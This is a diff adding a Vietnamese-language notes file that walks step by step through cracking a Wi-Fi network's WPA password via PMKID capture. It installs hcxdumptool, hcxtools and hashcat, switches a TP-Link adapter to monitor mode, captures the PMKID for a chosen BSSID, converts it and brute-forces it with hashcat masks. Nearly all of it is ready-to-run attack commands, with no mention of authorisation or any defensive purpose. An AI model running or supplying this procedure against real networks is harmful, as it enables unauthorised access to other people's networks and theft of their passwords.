@@ -1,0 +1,79 @@
+lay ma PMKID:
+CAI DAT UNG DUNG CAN THIET
+
+B1: Cai dat hcxdumptool --> Bat goi du lieu
+	git clone https://github.com/ZerBea/hcxdumptool.git --> tai file ve
+	cd hcxdumptool --> truy cap vao file hcxdumptool
+	sudo apt-get install libcurl4-openssl-dev libssl-dev pkg-config
+	sudo make
+	sudo make install
+	
+B2: Cai dat hcxtools --> để trích xuất dữ liệu cần thiết cho brute-force
+	git clone https://github.com/ZerBea/hcxtools.git
+	cd hcxtools
+	make
+	make install
+B3: Cai dat hashcat
+	sudo apt-get install hashcat
+
+
+THUC HIEN QUA TRINH LAY MA PMKID
+
+B1: Chuyen che do monitor mode
+	1. Ket noi  TP-Link TL-WN722N
+	2. Chay leng sau:
+
+	   sudo rmmod r8188eu.ko
+	   sudo modprobe 8188eu
+
+	3. Rut usb ket noi lai ngay
+	4. Chay leng sau:
+
+	   sudo ifconfig wlan0 down
+	   sudo airmon-ng check kill
+	   sudo iwconfig wlan0 mode monitor
+	   sudo ifconfig wlan0 up
+	   sudo iwconfig
+B2: Lay BSSID (bo qua dau 2 cham)
+	airodump-ng wlan0mon
+
+B3: Ghi ki tu BSSID vao 1 file nao do
+	echo "nhap BSSID"> URL/name_file.txt
+
+B4: hcxdumptool -o URL1/name_file.pcapng wlan0mon --filterlist=URL2 --filtermode=2 --enable_status
+	(trong do URL1/name_file.pcapng --> dia chi luu file bat data, URL2 dia chi chua BSSID trong buoc 3 )
+
+B5: cho doi cho den khi xuat hien code [FOUND PMKID] an Ctrl-C de thoat qua trinh chup data
+B6: Chuyen doi file .pcapng sang .16800
+	hcxpcaptool -z URL1.pcapng URL2.16800
+	(Trong do URL1-duong dan file .pcapng, URL1-duong dan luu file .16800)
+B7: Xem file chuyen doi
+	cat URL (URL-duong dan luu file.16800)
+
+THUC HIEN CRACK PASS (hashcat)
+
+chay lenh ./hashcat -m 16800 URL_file.16800 -a 3 -w 3 'dinh_dang_pass'
+
+dinh_dang_pass nhu sau
+?l = abcdefghijklmnopqrstuvwxyz
+?u = ABCDEFGHIJKLMNOPQRSTUVWXYZ
+?d = 0123456789
+?h = 0123456789abcdef
+?H = 0123456789ABCDEF
+?s = «space»!"#$%&'()*+,-./:;<=>?@[\]^_`{|}~
+?a = ?l?u?d?s
+?b = 0x00 - 0xff
+
+VD: ?l?l (Co 2 ki tu khieu chu thuong)  ;
+
+B8: Xem ket qua
+cat hashcat.potfile
+
+END 
+	   
+	
+
+
+
+	
+	
